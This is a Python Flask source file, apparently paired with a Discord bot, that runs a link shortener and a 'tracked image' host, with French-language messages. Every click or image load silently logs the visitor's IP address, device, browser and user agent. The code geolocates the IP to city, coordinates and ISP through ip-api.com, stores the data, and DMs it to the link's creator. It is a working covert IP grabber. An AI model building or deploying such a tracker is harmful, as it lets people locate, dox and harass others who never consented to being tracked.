import io
import sqlite3
from flask import Flask, request, redirect, send_file
from datetime import datetime
from user_agents import parse
import asyncio
from threading import Lock
import discord
import requests

app = Flask(__name__)
bot_instance = None
notify_lock = Lock()

def init_shortlink_db():
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_links (
            id TEXT PRIMARY KEY,
            original_url TEXT NOT NULL,
            user_id INTEGER NOT NULL,
            guild_id INTEGER NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            clicks INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS image_trackers (
            id TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL,
            guild_id INTEGER NOT NULL,
            title TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            clicks INTEGER DEFAULT 0,
            image_data BLOB
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS image_clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tracker_id TEXT NOT NULL,
            ip_address TEXT,
            browser TEXT,
            device_type TEXT,
            country TEXT,
            region TEXT,
            city TEXT,
            user_agent TEXT,
            clicked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(tracker_id) REFERENCES image_trackers(id)
        )
    ''')
    columns = {row[1] for row in cursor.execute("PRAGMA table_info(image_trackers)")}
    if "image_data" not in columns:
        cursor.execute("ALTER TABLE image_trackers ADD COLUMN image_data BLOB")
    conn.commit()
    conn.close()

def get_os_info(user_agent_str):
    os_info = "Inconnu"
    if 'Windows' in user_agent_str:
        if 'Windows NT 10.0' in user_agent_str:
            os_info = "🪟 Windows 10/11"
        else:
            os_info = "🪟 Windows"
    elif 'Mac' in user_agent_str:
        os_info = "🍎 macOS"
    elif 'Linux' in user_agent_str:
        os_info = "🐧 Linux"
    elif 'Android' in user_agent_str:
        os_info = "🤖 Android"
    elif 'iPhone' in user_agent_str or 'iPad' in user_agent_str:
        os_info = "🍎 iOS"
    
    return os_info

def get_ip_info(ip_address):
    try:
        response = requests.get(f'https://ip-api.com/json/{ip_address}?lang=fr', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return {
                    'country': data.get('country', 'Inconnu'),
                    'country_code': data.get('countryCode', 'XX'),
                    'region': data.get('regionName', 'Inconnu'),
                    'city': data.get('city', 'Inconnu'),
                    'isp': data.get('isp', 'Inconnu'),
                    'org': data.get('org', 'Inconnu'),
                    'lat': data.get('lat', 'N/A'),
                    'lon': data.get('lon', 'N/A'),
                    'timezone': data.get('timezone', 'Inconnu')
                }
    except:
        pass
    
    return None

async def notify_discord_shortlink(creator_id, short_id, ip_address, browser, device_type, user_agent_str):
    if not bot_instance:
        return
    
    try:
        creator = await bot_instance.fetch_user(creator_id)
        user_agent_obj = parse(user_agent_str)
        os_info = get_os_info(user_agent_str)
        ip_info = get_ip_info(ip_address)
        
        embed = discord.Embed(
            title="✨ Quelqu'un a cliqué sur ton lien!",
            description=f"Le lien **{short_id}** a reçu une visite 👀",
            color=discord.Color.brand_green(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="🔗 ID du lien", value=f"`{short_id}`", inline=False)
        
        embed.add_field(name="💻 INFORMATIONS SYSTÈME", value="‎", inline=False)
        embed.add_field(name="Appareil", value=f"📱 {device_type}", inline=True)
        embed.add_field(name="Système", value=os_info, inline=True)
        embed.add_field(name="Navigateur", value=f"🌐 {browser}", inline=True)
        
        embed.add_field(name="🌍 INFORMATIONS RÉSEAU", value="‎", inline=False)
        embed.add_field(name="Adresse IP", value=f"```{ip_address}```", inline=False)
        
        if ip_info:
            embed.add_field(name="🗺️ Géolocalisation", value="‎", inline=False)
            embed.add_field(name="Pays", value=f"🌐 {ip_info['country']}", inline=True)
            embed.add_field(name="Région", value=f"📍 {ip_info['region']}", inline=True)
            embed.add_field(name="Ville", value=f"🏙️ {ip_info['city']}", inline=True)
            embed.add_field(name="Fuseau horaire", value=f"🕐 {ip_info['timezone']}", inline=True)
            embed.add_field(name="Coordonnées", value=f"📌 {ip_info['lat']}, {ip_info['lon']}", inline=True)
            embed.add_field(name="FAI", value=f"🔗 {ip_info['isp']}", inline=True)
            embed.add_field(name="Code Pays", value=f"💾 {ip_info['country_code']}", inline=True)
            embed.add_field(name="Organisation", value=f"🏢 {ip_info['org']}", inline=True)
        
        embed.add_field(name="📋 DÉTAILS TECHNIQUES", value="‎", inline=False)
        embed.add_field(name="User-Agent", value=f"```{user_agent_str[:120]}```", inline=False)
        
        embed.add_field(name="⏰ Heure du clic", value=datetime.now().strftime("%d/%m/%Y à %H:%M:%S"), inline=False)
        
        embed.set_footer(text="Lien court | Détection de visite")
        
        await creator.send(embed=embed)
    except Exception as e:
        pass

async def notify_discord_image_click(owner_id, tracker_id, title, ip_address, browser, device_type, user_agent_str, ip_info):
    if not bot_instance:
        return
    try:
        owner = await bot_instance.fetch_user(owner_id)
        embed = discord.Embed(
            title="🖼️ Nouveau clic sur ton image",
            description=f"L'image **{title}** a été ouverte 👀",
            color=discord.Color.blurple(),
            timestamp=datetime.now()
        )
        embed.add_field(name="ID du tracker", value=f"`{tracker_id}`", inline=False)
        embed.add_field(name="Adresse IP", value=f"```{ip_address}```", inline=False)
        embed.add_field(name="Navigateur", value=f"🌐 {browser}", inline=True)
        embed.add_field(name="Appareil", value=f"📱 {device_type}", inline=True)
        if ip_info:
            embed.add_field(name="Pays", value=f"🌍 {ip_info.get('country', 'Inconnu')}", inline=True)
            embed.add_field(name="Région", value=f"📍 {ip_info.get('region', 'Inconnu')}", inline=True)
            embed.add_field(name="Ville", value=f"🏙️ {ip_info.get('city', 'Inconnu')}", inline=True)
        embed.add_field(name="User-Agent", value=f"```{user_agent_str[:120]}```", inline=False)
        embed.add_field(name="Horodatage", value=datetime.now().strftime("%d/%m/%Y à %H:%M:%S"), inline=False)
        await owner.send(embed=embed)
    except Exception:
        pass

@app.route('/image/<tracker_id>')
def serve_tracked_image(tracker_id):
    conn = sqlite3.connect("links.db")
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('''
        SELECT user_id, title, image_data
        FROM image_trackers
        WHERE id = ?
    ''', (tracker_id,))
    tracker = cursor.fetchone()
    if not tracker or not tracker["image_data"]:
        conn.close()
        return "Image non trouvée", 404
    image_bytes = tracker["image_data"]
    owner_id = tracker["user_id"]
    title = tracker["title"]
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    user_agent_obj = parse(user_agent_str)
    device_type = 'Mobile' if user_agent_obj.is_mobile else ('Tablet' if user_agent_obj.is_tablet else 'Desktop')
    browser_family = user_agent_obj.browser.family or 'Inconnu'
    browser = str(browser_family)
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address:
        if ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
    else:
        ip_address = 'Inconnu'
    ip_info = None if ip_address in ('', 'Inconnu', None) else get_ip_info(ip_address)
    country = ip_info.get('country') if ip_info else 'Inconnu'
    region = ip_info.get('region') if ip_info else 'Inconnu'
    city = ip_info.get('city') if ip_info else 'Inconnu'
    cursor.execute('''
        INSERT INTO image_clicks (tracker_id, ip_address, browser, device_type, country, region, city, user_agent)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (tracker_id, ip_address, browser, device_type, country, region, city, user_agent_str))
    cursor.execute('''
        UPDATE image_trackers
        SET clicks = clicks + 1
        WHERE id = ?
    ''', (tracker_id,))
    conn.commit()
    conn.close()
    if bot_instance:
        try:
            asyncio.run_coroutine_threadsafe(
                notify_discord_image_click(owner_id, tracker_id, title, ip_address, browser, device_type, user_agent_str, ip_info),
                bot_instance.loop
            )
        except Exception:
            pass
    buffer = io.BytesIO(image_bytes)
    buffer.seek(0)
    response = send_file(buffer, mimetype='image/png')
    response.headers['Cache-Control'] = 'no-store, max-age=0'
    return response

@app.route('/link/<short_id>')
def shortlink_redirect(short_id):
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    user_agent_obj = parse(user_agent_str)
    
    device_type = 'Mobile' if user_agent_obj.is_mobile else ('Tablet' if user_agent_obj.is_tablet else 'Desktop')
    browser = str(user_agent_obj.browser.family)
    
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
    
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT original_url, user_id, clicks
        FROM custom_links
        WHERE id = ?
    ''', (short_id,))
    
    result = cursor.fetchone()
    
    if result:
        original_url, user_id, clicks = result
        
        cursor.execute('''
            UPDATE custom_links
            SET clicks = clicks + 1
            WHERE id = ?
        ''', (short_id,))
        conn.commit()
        conn.close()
        
        if bot_instance:
            try:
                asyncio.run_coroutine_threadsafe(
                    notify_discord_shortlink(user_id, short_id, ip_address, browser, device_type, user_agent_str),
                    bot_instance.loop
                )
            except:
                pass
        
        return redirect(original_url)
    
    conn.close()
    return "Lien non trouvé", 404

def run_server(bot=None):
    global bot_instance
    bot_instance = bot
    init_shortlink_db()
    app.run(host='0.0.0.0', port=5001, debug=False)
